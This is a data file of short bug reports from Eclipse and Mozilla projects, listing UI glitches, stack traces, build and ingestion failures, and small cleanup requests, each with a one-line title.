4322,Created attachment 85428 Patch with suggested fix.  I'm all for using IAdapterManager for elements that don't implement IAdaptable.  But for elements that use an alternative adapter manager (e.g. DSF) and implement IAdaptable it is important that adapter service still calls the IAdaptable.getAdapter() directly.  The effectively breaks DSF so I'm marking it as critical.,VariableAdapterService should also call IAdaptable.getAdapter() for adaptables that implement this method directly.
4344,"Overview Description:    The probe of storage subsystems completed with error - Device service provider thread has died unexpectedly.    After probe job failed, any subsequent discovery/probe jobs will all fails with The agent didn't respond    The Data server_000001.log showed the following errors 11/20/06 12:21:07 PM SRV0068E: Device service provider thread has died unexpectedly. java.lang.ExceptionInInitializerError 	at org.eclipse.aperi.disk.discovery.RetryDeleteParameters.init(RetryDeleteParameters.java:42) 	at org.eclipse.aperi.gui.tape.common.model.TapeLibraryDBHelper.<init>(TapeLibraryDBHelper.java:58) 	at org.eclipse.aperi.discovery.RemoveMissingProcessor.<init>(RemoveMissingProcessor.java:93) 	at org.eclipse.aperi.discovery.RemoveMissingProcessor.<init>(RemoveMissingProcessor.java:79) 	at org.eclipse.aperi.server.jobs.ExecProbeSS.probeAll(ExecProbeSS.java:292) 	at org.eclipse.aperi.server.jobs.ExecProbeSS.doProbe(ExecProbeSS.java:151) 	at org.eclipse.aperi.server.jobs.ExecProbeSS.run(ExecProbeSS.java:83) 	at org.eclipse.aperi.server.handler.scheduler.JobHndlrThread.run(JobHndlrThread.java:64) 	at java.lang.Thread.run(Unknown Source) Caused by: java.lang.NullPointerException 	at org.eclipse.aperi.util.osgi.ServiceHelper.bindLocal(ServiceHelper.java:63) 	at org.eclipse.aperi.disk.api.impl.DiskManagerConfigSvc.bindConfigService(DiskManagerConfigSvc.java:72) 	at org.eclipse.aperi.disk.api.impl.DiskManagerConfigSvc.<clinit>(DiskManagerConfigSvc.java:42) 	... 9 more 11/20/06 12:21:07 PM SRV0021I: Shutting down service provider Device. 11/20/06 12:24:20 PM SRV0068E: Device service provider thread has died unexpectedly. java.lang.NoClassDefFoundError 	at org.eclipse.aperi.disk.discovery.RetryDeleteParameters.init(RetryDeleteParameters.java:42) 	at org.eclipse.aperi.gui.tape.common.model.TapeLibraryDBHelper.<init>(TapeLibraryDBHelper.java:58) 	at org.eclipse.aperi.discovery.RemoveMissingProcessor.<init>(RemoveMissingProcessor.java:93) 	at org.eclipse.aperi.discovery.RemoveMissingProcessor.<init>(RemoveMissingProcessor.java:79) 	at org.eclipse.aperi.server.jobs.ExecProbeSS.probeAll(ExecProbeSS.java:292) 	at org.eclipse.aperi.server.jobs.ExecProbeSS.doProbe(ExecProbeSS.java:151) 	at org.eclipse.aperi.server.jobs.ExecProbeSS.run(ExecProbeSS.java:83) 	at org.eclipse.aperi.server.handler.scheduler.JobHndlrThread.run(JobHndlrThread.java:64) 	at java.lang.Thread.run(Unknown Source)  Steps to Reproduce:     Just run a probe of storage subsystem will end with the above error  Actual Results:     The probe job failed with above error - The probe did finish all the collection of SS data  Expected Results:      The probe job finishs without error  Build Date & Platform:      Aperi-20061117-200029.zip windows platform",Device service provider thread has died unexpectedly at the end of probing Storage Subsystems
4345,"Created attachment 221140 A sample app to reproduce the problem.  The same SWT application produces the different DND result.   On SWT 3.6 Carbon, when we drag a tab item to Finder, a link file(about-blank 3.inetloc) will be created.  However, in SWT 3.7.2 Cocoa, when we drag the same tab item to Finder, a text file(about-blank.textClipping) will be created instead of a link file.   A link file is expected to created during DND with the same behavior with SWT Carbon. Please help to take a look at it. Thanks.","Drag and drop a tab item to desktop/Finder, a text file is created, not a web link is generated."
4391,"I20050823-0800  - In the Resource Navigator, create a simple project and create a folder 'f' in it - Copy .project from the project into folder f - Copy f/.project to clipboard, select the project, and paste - A Resource Exists dialog appears - exit the dialog by pressing the Esc key, or by clicking the close box  org.eclipse.swt.SWTException: Failed to execute runnable (java.lang.ArrayIndexOutOfBoundsException: -1) 	at org.eclipse.swt.SWT.error(SWT.java:3241) 	at org.eclipse.swt.SWT.error(SWT.java:3164) 	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:126) 	at org.eclipse.swt.widgets.Display.runAsyncMessages(Display.java:3113) 	at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:2768) 	at org.eclipse.jface.operation.ModalContext$ModalContextThread.block(ModalContext.java:153) 	at org.eclipse.jface.operation.ModalContext.run(ModalContext.java:303) 	at org.eclipse.jface.dialogs.ProgressMonitorDialog.run(ProgressMonitorDialog.java:453) 	at org.eclipse.ui.internal.progress.ProgressMonitorJobsDialog.run(ProgressMonitorJobsDialog.java:261) 	at org.eclipse.ui.actions.CopyFilesAndFoldersOperation.copyResources(CopyFilesAndFoldersOperation.java:473) 	at org.eclipse.ui.views.navigator.PasteAction.run(PasteAction.java:135) 	at org.eclipse.ui.actions.BaseSelectionListenerAction.runWithEvent(BaseSelectionListenerAction.java:167) 	at org.eclipse.ui.actions.TextActionHandler$PasteActionHandler.runWithEvent(TextActionHandler.java:258) 	at org.eclipse.ui.actions.RetargetAction.runWithEvent(RetargetAction.java:222) 	at org.eclipse.jface.commands.ActionHandler.execute(ActionHandler.java:117) 	at org.eclipse.core.commands.Command.execute(Command.java:311) 	at org.eclipse.core.commands.ParameterizedCommand.execute(ParameterizedCommand.java:396) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.executeCommand(WorkbenchKeyboard.java:459) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.press(WorkbenchKeyboard.java:781) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.processKeyEvent(WorkbenchKeyboard.java:828) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.filterKeySequenceBindings(WorkbenchKeyboard.java:550) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.access$3(WorkbenchKeyboard.java:493) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard$KeyDownFilter.handleEvent(WorkbenchKeyboard.java:117) 	at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:66) 	at org.eclipse.swt.widgets.Display.filterEvent(Display.java:920) 	at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:883) 	at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:908) 	at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:893) 	at org.eclipse.swt.widgets.Widget.sendKeyEvent(Widget.java:921) 	at org.eclipse.swt.widgets.Widget.sendKeyEvent(Widget.java:917) 	at org.eclipse.swt.widgets.Widget.wmChar(Widget.java:1231) 	at org.eclipse.swt.widgets.Control.WM_CHAR(Control.java:3157) 	at org.eclipse.swt.widgets.Tree.WM_CHAR(Tree.java:2948) 	at org.eclipse.swt.widgets.Control.windowProc(Control.java:3058) 	at org.eclipse.swt.widgets.Tree.windowProc(Tree.java:2908) 	at org.eclipse.swt.widgets.Display.windowProc(Display.java:3772) 	at org.eclipse.swt.internal.win32.OS.DispatchMessageW(Native Method) 	at org.eclipse.swt.internal.win32.OS.DispatchMessage(OS.java:1680) 	at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:2763) 	at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:1734) 	at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:1698) 	at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:367) 	at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:143) 	at org.eclipse.ui.internal.ide.IDEApplication.run(IDEApplication.java:103) 	at org.eclipse.core.internal.runtime.PlatformActivator$1.run(PlatformActivator.java:226) 	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:376) 	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:163) 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 	at java.lang.reflect.Method.invoke(Method.java:585) 	at org.eclipse.core.launcher.Main.invokeFramework(Main.java:338) 	at org.eclipse.core.launcher.Main.basicRun(Main.java:282) 	at org.eclipse.core.launcher.Main.run(Main.java:977) 	at org.eclipse.core.launcher.Main.main(Main.java:952) Caused by: java.lang.ArrayIndexOutOfBoundsException: -1 	at org.eclipse.ui.actions.CopyFilesAndFoldersOperation$1.run(CopyFilesAndFoldersOperation.java:260) 	at org.eclipse.ui.internal.UILockListener.doPendingWork(UILockListener.java:150) 	at org.eclipse.ui.internal.UISynchronizer$1.run(UISynchronizer.java:36) 	at org.eclipse.swt.widgets.RunnableLock.run(RunnableLock.java:35) 	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:123) 	... 52 more",[Navigator] AIOOBE when cancelling paste action override question
4405,HEAD  Should use same tool tip. Either just: Back Forward  or show page if available i.e.: Back Back to Page Goes Here Forward Forward to Page Goes Here  Second version seems more aligned to what we use elsewhere in the workbench.,[misc] Unify Javadoc view and hover back/forward
4479,Various places in our code we are not using the constants from JSONConstants when crafting JSON messages (when we should be).,Clean up constant usage
4605,"1- Go to a MERGED review in EGerrit 2- Press the Reply... button  => A dialogue comes up saying ""No user login to set the status with the reply"". Once I press OK, everything works as expected.  My guess is that it is a forgotten information dialogue that should be removed.","""No user login to set the status with the reply"" dialogue pops up when replying to a merged review"
4744,"SWT.COLOR_WIDGET_BACKGROUND should be used for ""disabled"" backgrounds of Text, StyledText, List etc.  > search/replace on JDT codebase ""SWT.COLOR_GRAY"", ""SWT.COLOR_DARK_GRAY"", ""SWT.COLOR_LIGHT_GRAY"", ""disabled""  This bug originated in bug 186161.",[preferences] use SWT.COLOR_WIDGET_BACKGROUND for disabled backgrounds; use SWT.COLOR_DARK_GRAY for disabled foregrounds
4745,"20070918  On the editor templates preference page, all templates have their description in lower case (for example 'author name', 'iterate over collection')  The SWT templates should be consistent: 'new browser', 'new button'.",SWT templates description should use lower case
4877,"3.2 RC2 The batch compiler help message says that -X<option> is ignored, but talks about a -Xemacs option a few lines below.   Moreover, that option only affects the standard output and regular log file (not the xml output of xml log files), which is not documented. (Note: in case an xml log file is in use but the console is active, the -Xemacs option modifies the contents of the console - hence -log file.xml and -Xemacs are still compatible.)",[batch][options] inconsistent help message: -X<option> vs -Xemacs
4989,+++ This bug was initially created as a clone of Bug #698552 +++  mozilla-central and mozilla-aurora hold a private patch to NSS that implements an API currently needed by Gecko's SSL implementation. We can never ship a version of Firefox that *requires* private patches to NSS like this because it will break Linux vendor releases that use system NSS.  See the blocking bugs to see the work that needs to be done,Update mozilla-central + mozilla-aurora +mozilla-beta to NSS 3.13.2 final release (requires NSPR 4.9 final release)
5048,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312  When creating a new profile last character typed is not shown in the target location. See screenshot.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.,Last character typed in text field when creating new profile is not displayed in target location
5070,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7  Under Tools/Options/Web Features/Advanced Javascript, The window that pops up is 1) too small to display the text, and 2) Not resizable.  The First line of text shows as ""Move or resize existing wind...""  Reproducible: Always  Steps to Reproduce: 1. Open tools menu 2. Select Options  3. Select ""Web features Tab"" 4. Under Javasript, click the ""Advanced"" Button.  5. Look at the window  Actual Results:   The First line of text shows as ""Move or resize existing wind...""  Expected Results:   Opened a larger window. And the window must be resizeable. If someone is using larger fonts, even if the window is made larger, it may not be big enough. All windows should be resizable, no matter how small or simple they are.  I have large fonts selected",Advanced Javascript window incorrectly sized.
5148,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312  Suppose you visited a site whose url starts with a 't' (http://tilos.hu), then you want to go back by using the url bar autocomplete, it works incorrectly: you enter a 't' and this is what you get: ""ttp://tilos.hu/"".   Reproducible: Always  Steps to Reproduce: 0. (clear your history) 1. go to http://tilos.hu/ 2. go to somewhere else 3. press ctrl+l, press 't'.  Actual Results:   ""ttp://tilos.hu/"" was displayed in the url bar.  Expected Results:   tilos.hu should be displayed, or http://tilos.hu/ should be displayed. Either case, when I hit enter, I should be taken to somewhere meaningful.",autocomplete screws up URLs starting with a 't'
5221,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4  When a page has non-standard-ASCII text in the body or title (or possibly other places), the cursor in text entry areas has a dot attached to it.  Example: - Page with international text: http://www.csc.uvic.ca/~nrqm/cursor_intl.html - Same page without international text: http://www.csc.uvic.ca/~nrqm/cursor_nointl.html  The first example has Arabic text in the page body, and the second example has just standard ASCII text.  Click on the textarea box to see the misshapen cursor.  If it doesn't work for others, here is what I see: http://www.csc.uvic.ca/~nrqm/pic/cursor.png  Reproducible: Always  Steps to Reproduce: 1. Go to a web site with international text and a text entry area. 2. Click on the text entry area. 3. That's pretty much it.  Actual Results:   The entry cursor had a few-pixel lump growing out its side.  Expected Results:   The entry cursor should just be a vertical bar.  I'm told it happens in Netscape, too.  It doesn't happen in Internet Explorer or Opera.",The input cursor is misshapen in text input boxes and textareas when page has international text.
5286,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040531 Firefox/0.8.0+ Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040531 Firefox/0.8.0+  Canceling a download doesn't refresh the download manager title.  Reproducible: Always Steps to Reproduce: 1. Start downloading a couple of big file. 2. Cancel one of the download.  Actual Results:   The Download Manager title isn't changed.  Expected Results:   Decrease the counter that counts the downloads.,"Download manager progress and title do not update correctly, wrong number of files and percentage after finishing or cancelling a download"
5306,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b5) Gecko/20051006 Firefox/1.4.1  See the example page for demonstration. There is a table that has been put  together based on a stylesheet, and when a link is clicked, the table layout  changes. The best example is to click on ""items"" the link isn't even followed  and the table shrinks. When you click on a left-hand subheading the link is  followed, but right before the page changes, you can see that the tables expand.  Reproducible: Always  Steps to Reproduce: 1.Load page 2.Click items 3.Click somewhere in the white space  Actual Results:   On the item click, the table seems to collapse. Then a whitespace click causes  the tables to collapse further.  Expected Results:   Even if the CSS is fishy or written wierd, I would expect a consistant render  of whatever the stylesheet says. I don't know why there would be dynamic layout  changes on a page that seems to be configured to be static.",CSS table layout changes on mouse click.
5325,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; es-AR; rv:1.7.12) Gecko/20050919 Firefox/1.0.7 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-AR; rv:1.7.12) Gecko/20050919 Firefox/1.0.7  If open bookmark manager and go to preferences of a site you will find changed the word ""dirección"" by ""descripción"".  Example: Nombre: my web Descripción: http:// .... <---- this is the error, change Descripción by Dirección Palabra Clave: Descripción: <---- In this place the word is OK.  Spanish version. Mozilla/5.0 (Windows; U; Windows NT 5.1; es-AR; rv:1.7.12) Gecko/20050919 Firefox/1.0.7  Reproducible: Always  Steps to Reproduce: 1. Open FireFox 2. Bookmark Manager 3. Perefenreces of a site","Problem with bookmark in spanish, label problem."
5339,"The variable rc4key is not used and can be removed.  diff -r1.40 keydb.c 720d719 <     SECItem *rc4key = NULL; 889,892d887 <     if ( rc4key ) { <       SECITEM_FreeItem(rc4key, PR_TRUE); <     } <","Coverity 172, dead code in mozilla/security/nss/lib/softoken/keydb.c"
5532,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b4pre) Gecko/20090328 Shiretoko/3.5b4pre Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b4pre) Gecko/20090328 Shiretoko/3.5b4pre  Live streaming video doesn’t fit the progress bar metaphor that the current <video> controls use.  Reproducible: Always  Steps to Reproduce: 1. Visit http://air.mozilla.com/europe/ 2. Wait for video to load 3. Hover mouse over video to see controls Actual Results:   The video load progress bar can be seen to wobble between 99% & 100%  Expected Results:   The load progress shouldn’t wobble. Suggested fix would be to change it be a barbers pole (moving stripes), or similar, to indicate streaming.",Video progress slider jitters on indefinite length streams
5570,"Created attachment 485674 screenshot  Build ID:   Mozilla/5.0 (Windows NT 6.1; rv:2.0b8pre) Gecko/20101021 Firefox/4.0b8pre  Prerequisites:  Clean profile, no extensions No personas, themes  Steps:  1. Make sure you have some tabs opened  2. Enter fullscreen mode (view->fullscreen or F11)  3. Perform mouse hover() event to trigger the tab bar  4. Move some tabs around via drag&drop   Behavior:  Tab positioning indicator is not available. Can be confusing when having lots of tabs and we are interested in positioning them accurately.   Note: see screenshot",Don't put the tab drop indicator above tabs
5621,"Created attachment 8763301 Screenshot.png  User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 Build ID: 20160617004051  Steps to reproduce:  1. Open Firefox Developer Edition on a new profile    Actual results:  Graphical glitches appears throughout prompt display and hides out 'Start Page' and 'Open Menu' icon.   Expected results:  Both icons should display without any glitches.  NOTE: * Tried on multiple new profiles, but the result is same. * Only happens on Firefox Developer Edition.",Graphical Glitches occur on 'Start Page' and 'Open Menu' icon throughout prompt display
5663,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.7) Gecko/20011221 BuildID:    2001122108  If you change the from address before writing the message, the signature will also change (this is correct), but when you hit tab to start typing the message at the top, the cursor will show at the bottom, while it should appear at the top, to start typing the message.  Reproducible: Always Steps to Reproduce: 1. Create a new message 2. Change the from adress 3. Go to the message body: the cursor will start at the bottom (after the signature), but it should go to the top, before the signature.",Caret (cursor) is positioned after the signature if you change the identity (From: address)
5687,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040707 Firefox/0.9.2 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.1) Gecko/20040707  When new messages are retrieved in Mozilla Mail, the icon next to the Inbox folder changes to have an arrow indicating new unread messages.  If the new messages are deleted without being displayed (e.g. if they are spam), the icon indicating new unread messages doesn't go away unless you switch to another folder and back onto the Inbox or close and re-open the Mozilla Mail window.  Reproducible: Always Steps to Reproduce: 1. Retrieve new messages and see Inbox icon change to 'arrow' icon 2. Delete whatever new message showed up in the Inbox without displaying them Actual Results:   New messages are gone from Inbox, but 'arrow' icon indicating new messages is still next to the Inbox folder name  Expected Results:   The 'arrow' icon should change back to the normal Inbox icon",Icon indicating new Email in Inbox remains if new Emails are deleted w/o being read
5712,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040707 Firefox/0.9.2 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040707 Firefox/0.9.2    This occurs when ""Add Bookmark"" is expanded to ""Show all Bookmarks Folders"". When this window is resized by dragging the corner of the dialog box, the folder-view does not resize correctly.   The visible wrong effect is that the folder view is tied to to the bottom (where the buttons are), but not to the top (where the pull-down menu, and check-box are). The folder view expands, but not at the same rate that the window expands, and is therefore incorrect.   The correct effect would be that the folder view would be tied to the bottom and the top so that when the entire dialog is expanded, the folder-view expands at the same rate.  Reproducible: Always Steps to Reproduce: 1. Pull down ""Bookmarks"" -> ""Bookmark This Page.."" 2. Click the arrow ""Show all the bookmarks folders"" 3. Using the edge/border of the dialog window, drag the window to a larger size in the vertical direction.  Actual Results:   Notice that the spacing between the ""Bookmark all tabs in a folder"" checkbox is now spaced much further away from the folder view than before.  Expected Results:   The spacing between the checkbox and the folder view should remain constant. This should be just like the spacing between the folder view and the buttons at the bottom.  New installation of windows XP and new installation of Firefox. No previous browsers (other than IE) or other software have been installed.","expanded ""Add Bookmark"" dialog does not resize properly"
5742,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; m15) BuildID:    2000041805  If you look at the URL and its source, when you have <p></p> as your paragraph break signal, the Mozilla browser won't put a paragraph break between topics. Actually, it'll do so for the first set but not the rest.  So, 1<p></p>2<p></p>3<p></p>4  will probably end up looking like... 1  2 3 4    Reproducible: Always Steps to Reproduce: 1.  Create a new HTML page 2.  Put 1<p></p>2<p></p>3<p></p>4 in the body 3.  Load page	  Actual Results:  It would show...  1  2 3 4    Expected Results:  1  2  3  4",No paragraph break when <p></p> tag is used
5787,"When loading an .shtml file, static content is displayed, but the browser churns forever and the embedded SSI is never executed.",Server-side Includes are not executed
5824,"When you click on ""Pause"" in the new download manager, the download should be stopped, but Firebird continues to download the file.  Steps to reproduce: 1. Right-click on a download link, then ""save target as"". 2. Open the Download manager (Tools > Downloads) 3. Select the file and click on ""Pause""  Expected results: 1. Pause the downloading  Actual results: 1. Firebird continues to download the file.  I am using 20031128-gtk2+xft build of Firebird-trunk. (Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6b) Gecko/20031128 Firebird/0.7+)",Pause in Firebird's new download manager does not work
5925,"User-Agent:       Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.2; Okina Consulting www.okina.net) Gecko/20040803 Build Identifier: Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.7.2; Okina Consulting www.okina.net) Gecko/20040803  When I view the Element Properties for an image with long ""alt"" text, the text for ""alt"" doesn't wrap in the Element Properties dialog.  So, if I invoke Properties for an image (by right-clicking or Ctl-clicking it, then select Properties), and the image has a long ""alt"" text, that alt text will run beyond the right edge of the dialog, instead of wrapping gracefully within the dialog.  Reproducible: Always Steps to Reproduce: 1. Open web page with an image that has a verbose ""alt"" string assigned to it 2. Open Element Properties for that image 3. Look at how Alternate Text is displayed -- it doesn't wrap.  Actual Results:   Can only read the first few words of the alt text.  Expected Results:   Wrap the long string to display all the text within the dialog.",Element Properties for an image doesn't wrap long alt text.
5963,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4b) Gecko/20030516 Mozilla Firebird/0.6 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4b) Gecko/20030516 Mozilla Thunderbird 0.1 (20030726)  I look actually in the trash folder with 3pane view. After i empty the trash on local folder per Menu File->Empty Trash, in the 3pane message window remain still emtpy lines with a letter symbol and no text. And also message text below doesn't disappear if the last marked messages was a message of trash. I can move around this lines each for an old existing messages and nothing happend: No change in message window below and no refresh, which could solve this ""display error"".  Reproducible: Always  Steps to Reproduce: 1. Select Folder trash of an other account 2. Empty trash per menu Actual Results:   Can mark now empty entries in the trash and display doesn't change.  Expected Results:   Clear message and message text window  First if i change the folder and than back to trash. all is gone in display.",In 3pane window the message window of trash folder is not really empty after empty trash.
6010,Created attachment 262223 Remove the min-height from descendant spinbutton buttons  On Windows (haven't seen the same behavior on Mac/GNOME) numberboxes with spinbuttons enabled are about 4px taller than their regular textbox counterparts.,Numberboxes are a bit too tall on Windows
6025,"User-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.5) Gecko/2008121623 Ubuntu/8.10 (intrepid) Firefox/3.0.5 Ubiquity/0.1.4 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.5) Gecko/2008121623 Ubuntu/8.10 (intrepid) Firefox/3.0.5 Ubiquity/0.1.4  When Firefox starts up, it checks for addon updates and gives me the option to install them.  Afterwards (if there are no problems), the window remains informing me that the addons were successfully updated.  I must click Continue before the rest of Firefox loads.  If there is no problem updating, I don't care.  I want to use firefox, not stare at a screen saying ""Update successful"" and look how to close that screen. If for some reason FX absolutely must inform the user that the update didn't fail, perhaps the slidedown notification system (popup blocker, Know Your Rights) could be used.  Reproducible: Always  Steps to Reproduce: 1. Close firefox with an old addon 2. Reopen firefox and update addon 3. Read that the install completed successfully, and wonder why firefox hasn't loaded.",Addon update confirmation is modal and blocks loading of firefox
6029,"User-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.7) Gecko/2009032813 Iceweasel/3.0.6 (Debian-3.0.6-1) Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.7) Gecko/2009032813 Iceweasel/3.0.6 (Debian-3.0.6-1)  For most Firefox windows, the monitor location where the Firefox application window is located is used.  For example, Tools -> Downloads will display the ""Downloads"" window in the same monitor as the Firefox window, even when on a secondary monitor.  The ""Preferences"" window always uses the primary monitor.  Reproducible: Always  Steps to Reproduce: 1.Open Firefox on multi-monitor desktop.  Move application window to a non-primary monitor. 2.Open ""Preferences"" window with Edit -> Preferences. 3.Observe location of new ""Preferences"" window. Actual Results:   ""Preferences"" window will appear on primary monitor, while Firefox application window does not.  Expected Results:   ""Preferences"" window should appear on the same monitor as the Firefox application window, just like other toolbox windows do.","""Preferences"" window appears on wrong monitor with dual-screen desktops"
6138,"actual results:   28   cvsroot => ""The <a href=\""http://www.cvshome.org\"">CVS</a> root that most "" _   29              ""users of your system will be using for 'cvs diff'. Used in "" _   30              ""Patch Viewer ('Diff' option on patches) to figure out where "" _   31              ""patches are rooted even if users did the 'cvs diff' from "" _   32              ""different places in the directory structure (NOTE: if your "" _   33              ""CVS repository is remote and requires a password, you must "" _   34              ""either ensure the $terms.Bugzilla user has done a 'cvs login' or "" _   35              ""specify the password "" _   36              ""<a href=\""http://www.cvshome.org/docs/manual/cvs_2.html#SEC26\"">as "" _   37              ""part of the CVS root.</a>). Leave this blank if you have no "" _   38              ""CVS repository."",   39",patchview param_descs for cvsroot is poorly punctuated
6151,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b2) Gecko/20050619 Firefox/1.0+ Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b2) Gecko/20050619 Firefox/1.0+  On the Help menu, ""Report Broken Website"" should be renamed ""Report Broken Website..."" for HIG consistency (also to be consistent with ""Check for Updates"".  Also, the R keyboard shortcut conflicts with Release Notes.  Reproducible: Always","""Report Broken Website"" should be followed by ellipsis"
6404,"We would like to be able to login to remo portal using a @mozilla.com, @mozilla.org or @mozillafoundation.org account  The expected functionality is:  - Once you login you are staying in the same page you are - If the email exists we are not creating a new account (and just continue provide same functionality as before) - If your email is new we are creating ""visitor"" accounts with no profile no dashboard and no link to your profile in the top login bar. - We grant those accounts ability to use the export/email function of the /people page and be able to see the mails of people in their profile without using re-captcha, same way we do with authenticated users now (reps, mentors, admins)  I think that covers it :)",Ability to login using mozilla emails and have limited access
6455,"When the debugger is paused, refreshing the debuggee does not emit a tabNavigated event.  It looks like it's due to an error in request.suspend() that prevents the event from being emitted.  https://www.irccloud.com/pastebin/CaJRoQ5q/",Debugger fails to emit tabNavigated event when paused
6462,"Last night buildbot builds weren't being ingested for an hour or two - see IRC logs: http://logs.glob.uno/?c=mozilla%23releng&s=18+May+2016&e=19+May+2016&b=1#c246737 http://logs.glob.uno/?c=mozilla%23treeherder&s=18+May+2016&e=19+May+2016&b=1#c102502  Of note: * Prod revision was 3442b2f1193651808a4fa7741d72038abcd7c8d5 * There were no recent deployments (last was 7 days ago: https://rpm.newrelic.com/accounts/677903/applications/4180461/deployments) * There was not a massive backlog of celery jobs (https://rpm.newrelic.com/accounts/677903/dashboard/13318367/page/1?tw%5Bend%5D=1463620893&tw%5Bstart%5D=1463608881) * However there were a number of exceptions: https://rpm.newrelic.com/accounts/677903/applications/4180461/traced_errors?tw%5Bend%5D=1463620893&tw%5Bstart%5D=1463608881  Specifically HTTP 500s when the builds4hr ingestion task posted the jobs back to the API: https://rpm.newrelic.com/accounts/677903/applications/4180461/traced_errors/4e92a0-dcff726e-1d5f-11e6-b947-b82a72d22a14  Caused by KeyErrors during treeherder.webapp.api.jobs:JobsViewSet.create: https://rpm.newrelic.com/accounts/677903/applications/4180461/traced_errors/4eb47b-c1b9801d-1d5f-11e6-b947-b82a72d22a14  The exception happened on this line: https://github.com/mozilla/treeherder/blame/3442b2f1193651808a4fa7741d72038abcd7c8d5/treeherder/model/derived/jobs.py#L1782  Which was recently changed in bug 1265037: https://github.com/mozilla/treeherder/commit/104787282d0db965ea948342ce1f2926936f3d27  The guid handling for buildbot retried jobs (which attempts to work around buildbot quirks) has always been pretty hacky (and not well documented), guess we missed an edge case :-)","JobsViewSet.create exceptions from builds-4hr ingestion (""KeyError: 'd31974e5eb4ed77615decff56fffb6dd3882909c'"")"
6498,"Seems like z-ordering for intersecting planes not working properly also I see this in debug build log ###!!! ASSERTION: Child transform frame must preserve 3d!: 'childFrame->Preserves3D()', file layout/generic/nsFrame.cpp, line 1484",Intersecting planes are not z-ordered properly (need to implement plane splitting for CSS 3d transforms)
6580,+++ This bug was initially created as a clone of Bug #1363541 +++  From bug 1363541 part 3:  https://hg.mozilla.org/mozilla-central/rev/1d7b14496648653222e010e2568cf24d6051cc11  All the extensions/permissions/test/unit/ tests are failing.,Port changes from bug 1363541 to Thunderbird: Permission Manager should not block the first window from painting
6607,Three prefs are needed in firefox.js,Setup some prefs for firefox.js for DS mitigation strat
